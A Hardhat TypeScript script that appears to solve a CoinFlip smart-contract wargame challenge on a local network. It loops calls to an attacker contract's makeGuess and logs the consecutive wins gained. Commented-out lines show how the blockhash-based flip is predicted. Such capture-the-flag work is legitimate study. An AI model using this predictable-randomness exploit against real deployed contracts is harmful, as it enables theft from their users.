import { ethers } from "hardhat";
import coinflip_deployment from "../deployments/localhost/CoinFlip.json";
import hackcoinflip_deployment from "../deployments/localhost/HackCoinFlip.json";
import { CoinFlip } from "../typechain-types/CoinFlip";
import { HackCoinFlip } from "../typechain-types/HackerCoinFlip.sol";

async function main() {
    const coinflip = await ethers.getContractFactory("CoinFlip");
    let contract = await coinflip.attach("0x96BD2089D8C7a3e3d4fCfebad82a352B4c92b0Bf") as CoinFlip;

    const hackcoinflip = await ethers.getContractFactory("HackCoinFlip");
    let hackContract = await hackcoinflip.attach("0xd950B7CB8310E2CDD068D89793E583008E4abfe7") as HackCoinFlip;

    const [deployer, account2] = await ethers.getSigners();
    console.log('deployer', deployer.address, 'account2', account2.address);

    //console.log('cons wins', await getConsWins(contract));
    //console.log('flip contract', contract.address);

    //console.log('contract cons wins', await contract.consecutiveWins());
    //console.log('hack cons wins', await hackContract.getConsecutiveWins());


    // reverse engineering contract to make correct guess
    //const provider = ethers.getDefaultProvider();
    //const block = await provider.getBlock("latest");
    //console.log('block', block);
    //const FACTOR = ethers.BigNumber.from("57896044618658097711785492504343953926634992332820282019728792003956564819968");
    //let blockParentHash = (await block).parentHash;
    //console.log('parentHash', blockParentHash);
    for (let index = 0; index < 5; index++) {
        console.log(index);
        await hackContract.makeGuess({
            gasLimit: 4000000
        });
        console.log('cons wins', await getConsWins(contract));
    }

    console.log('cons wins', await getConsWins(contract));

    //let blockValue = parseInt();
    //console.log('blockValue', blockValue);
    //let coinFlip = ethers.BigNumber.from(blockValue.toString()).div(FACTOR);
    //uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    //uint256 coinFlip = blockValue.div(FACTOR);
    //let side: boolean = coinFlip.toNumber() == 1 ? true : false;

}

async function getConsWins(contract: CoinFlip) {
    let consWins = await contract.consecutiveWins();
    return consWins.toNumber();
}

main().catch((error) => {
    console.error(error);
    process.exit(1);
});